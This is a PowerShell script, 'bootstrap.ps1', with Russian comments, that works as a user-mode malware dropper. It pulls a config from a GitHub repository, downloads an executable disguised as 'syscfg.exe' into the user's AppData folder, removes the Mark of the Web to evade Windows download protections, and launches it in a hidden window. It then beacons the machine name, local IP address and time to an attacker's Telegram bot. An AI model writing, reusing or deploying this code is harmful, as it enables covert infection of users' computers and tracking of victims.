# =========================================
# bootstrap.ps1
# User-mode bootstrap (no admin required)
# =========================================

try {
    # --- GitHub требует TLS 1.2
    [Net.ServicePointManager]::SecurityProtocol = 3072

    # --- URLs
    $CFG_URL = 'https://github.com/sapog228ru-ship-it/test/raw/refs/heads/main/cfg.json'

    # --- Путь ДЛЯ ПОЛЬЗОВАТЕЛЯ (НЕ TEMP)
    $EXE_PATH = Join-Path $env:LOCALAPPDATA 'syscfg.exe'

    # --- Получаем конфиг
    $cfg = Invoke-RestMethod -Uri $CFG_URL -UseBasicParsing

    if (-not $cfg.exe) {
        throw 'cfg.json: exe url missing'
    }

    # --- Скачиваем EXE
    Invoke-WebRequest -Uri $cfg.exe -OutFile $EXE_PATH -UseBasicParsing

    if (-not (Test-Path $EXE_PATH)) {
        throw 'EXE download failed'
    }

    # --- Убираем Mark of the Web (НЕ требует admin)
    Unblock-File -Path $EXE_PATH -ErrorAction SilentlyContinue

    # --- Запускаем EXE (user-context)
    Start-Process -FilePath $EXE_PATH -WindowStyle Hidden

    # --- Определяем IPv4 пользователя
    $ip = [System.Net.Dns]::GetHostAddresses(
        [System.Net.Dns]::GetHostName()
    ) | Where-Object {
        $_.AddressFamily -eq 'InterNetwork' -and
        $_.IPAddressToString -notlike '169.254*' -and
        $_.IPAddressToString -notlike '127.*'
    } | Select-Object -First 1 | ForEach-Object {
        $_.IPAddressToString
    }

    if (-not $ip) { $ip = 'no-ip' }

    # --- Telegram OK
    Invoke-RestMethod `
        -Uri "https://api.telegram.org/bot$($cfg.tg.token)/sendMessage" `
        -Method Post `
        -Body @{
            chat_id = $cfg.tg.chat
            text    = "OK $env:COMPUTERNAME $ip $(Get-Date -Format 'yyyy-MM-dd HH:mm')"
        }

}
catch {
    # --- Telegram ERROR (если что-то пошло не так)
    try {
        Invoke-RestMethod `
            -Uri "https://api.telegram.org/bot$($cfg.tg.token)/sendMessage" `
            -Method Post `
            -Body @{
                chat_id = $cfg.tg.chat
                text    = "ERROR $env:COMPUTERNAME $($_.Exception.Message)"
            }
    } catch {}
}
